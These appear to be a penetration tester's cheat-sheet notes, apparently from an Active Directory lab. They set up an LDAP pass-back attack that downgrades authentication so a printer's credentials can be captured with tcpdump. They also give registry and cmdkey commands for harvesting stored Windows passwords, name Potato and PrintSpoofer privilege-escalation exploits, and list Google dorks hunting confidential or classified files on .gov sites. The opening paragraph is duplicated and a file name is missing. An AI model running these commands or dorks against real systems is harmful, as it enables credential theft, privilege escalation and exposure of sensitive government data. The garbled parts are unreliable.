We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:

To capture the credentials in clear-text, we need to re-configure the LDAP server to support PLAIN and LOGIN authentication methods. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:

#olcSaslSecProps.ldif

dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred



sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart // to patch ldif file to our ldap server

To verify the modification:

ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN

Change the server ip on printer webpage then start, Check the following error: "This distinguished name contains invalid syntax". If you receive this error, then use a tcpdump to capture the credentials.

sudo tcpdump -SX -i breachad tcp port 389

## registry passwords check

reg query HKLM /f password /t REG_SZ /s

To find admin AutoLogon credential:

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

List any saved credentials:

cmdkey /list


# SeImpersonatePrivilege - windows


If the machine is >= Windows 10 1809 & Windows Server 2019 — Try Rogue Potato
If the machine is < Windows 10 1809 < Windows Server 2019 — Try Juicy Potato

or Printerspoofer exploit it


## Google Droks

```
inurl:.gov not for distribution | confidential | “employee only” | proprietary | top secret | classified | trade secret | internal | private filetype:xls

inurl:.gov not for distribution | confidential | “employee only” | proprietary | top secret | classified | trade secret | internal | private filetype:csv

inurl:.gov not for distribution | confidential | “employee only” | proprietary | top secret | classified | trade secret | internal | private filetype:doc

inurl:.gov not for distribution | confidential | “employee only” | proprietary | top secret | classified | trade secret | internal | private filetype:txt

```
